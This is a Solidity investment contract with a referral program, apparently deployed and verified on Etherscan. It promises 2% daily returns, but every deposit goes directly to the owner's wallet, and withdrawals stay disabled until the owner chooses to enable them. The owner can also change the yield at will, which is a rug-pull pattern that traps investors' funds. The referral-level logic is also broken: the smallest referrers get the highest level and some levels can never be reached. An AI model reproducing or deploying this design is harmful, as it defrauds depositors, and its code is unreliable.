/**
 *Submitted for verification at Etherscan.io on 2024-03-17
*/

/**
 *Submitted for verification at Etherscan.io on 2024-03-17
*/

/**
 *Submitted for verification at Etherscan.io on 2024-03-17
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IERC20{
    function transfer(address to, uint tokens) external returns (bool success);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) ;
}


contract Invest {

    struct Investment {
        uint amount;
        uint last_withdraw_time;
    }

    struct Referral {

        uint level;
        uint reward_all_time;
        uint reward;
        uint refer_persons;

    }

    address public owner;

    IERC20 public token;

    // investment range
    uint public minimum_investment = 50e18;
    uint public maximum_investment = 1000e18;

    mapping(address => Investment) public investments;
    mapping(address => Referral) public referrals;

    uint public total_invested;

    uint public total_profit;
    uint public active_users;

    bool public is_enabled_withdraw = false;

    uint apy = 2; // per second.

    modifier onlyOwner(){
        require(msg.sender == owner, "Invest: only owner can call this function");
        _;
        
    }

    constructor(address _token) {
        token = IERC20(_token);
        owner = msg.sender;
    }


    function invest(uint _amount, address _referral) external {

        require(_amount >= minimum_investment, "Invest: amount is less than minimum investment");
        require(_amount <= maximum_investment, "Invest: amount is more than maximum investment");


        // check if referral is not the same as the sender or address(0) and if the referral is not already referred by the sender
        uint reward = 0;
        if(_referral != msg.sender && _referral != address(0) ){
            referrals[_referral].refer_persons += 1;
            uint level = getReferralLevel(_referral);
            reward = _amount * level / 100; // based on the level 
            referrals[_referral].reward += reward;
            referrals[_referral].reward_all_time += reward;
        }
        require(token.transferFrom(msg.sender, owner, _amount-reward), "Invest: transfer failed");

        if(investments[msg.sender].amount > 0){
            uint amount = calculateDividends(msg.sender);
            require(token.transfer(msg.sender, amount), "Invest: transfer failed");
        }else{
            active_users += 1;
        }

        investments[msg.sender].amount += _amount;
        investments[msg.sender].last_withdraw_time = block.timestamp;
        total_invested += _amount;


    }

    function withdraw(uint _amount) external {
        
        require(is_enabled_withdraw, "Invest: withdraw is disabled");
        uint amount = calculateDividends(msg.sender);
        require(investments[msg.sender].amount + amount >= _amount, "Invest: amount is more than invested amount");

        investments[msg.sender].amount = investments[msg.sender].amount - _amount;
        uint total = _amount + amount;
        
        require(token.transfer(msg.sender, (total * 97)/100), "Invest: transfer failed");
        require(token.transfer(owner, (total * 3)/100), "Invest: transfer failed");

        investments[msg.sender].last_withdraw_time = block.timestamp;
        total_profit += amount;
    }

    function calculateDividends(address _user) public view returns(uint){
        uint time = block.timestamp - investments[_user].last_withdraw_time;
        return (investments[_user].amount * time * apy)/(100*24*60*60);
    
    }

    function claimReferralRewards() external {
        uint amount = referrals[msg.sender].reward;
        require(amount > 0, "Invest: no referral rewards to claim");
        referrals[msg.sender].reward = 0;
        require(token.transfer(msg.sender, amount), "Invest: transfer failed");
    }

    function getReferralLevel(address _user) public view returns(uint){
        
        if(referrals[_user].refer_persons >= 10){
            return 1;
        }else if(referrals[_user].refer_persons >= 20){
            return 2;
        }else if(referrals[_user].refer_persons >= 30){
            return 3;
        }else if(referrals[_user].refer_persons >= 40){
            return 4;
        }else {
            return 5;
        }
    }

    function transferOwnership(address _newOwner) external onlyOwner {
        owner = _newOwner;
    }

    function renounceOwnership() external onlyOwner {
        owner = address(0);
    }

    function setMinimumInvestment(uint _amount) external onlyOwner {
        minimum_investment = _amount;
    }

    function setMaximumInvestment(uint _amount) external onlyOwner {
        maximum_investment = _amount;
    }

    function setAPY(uint _apy) external onlyOwner {
        apy = _apy;
    }

    function setIs_enabled_withdraw (bool _is_enabled_withdraw) external onlyOwner {
        is_enabled_withdraw = _is_enabled_withdraw;
    }

    

}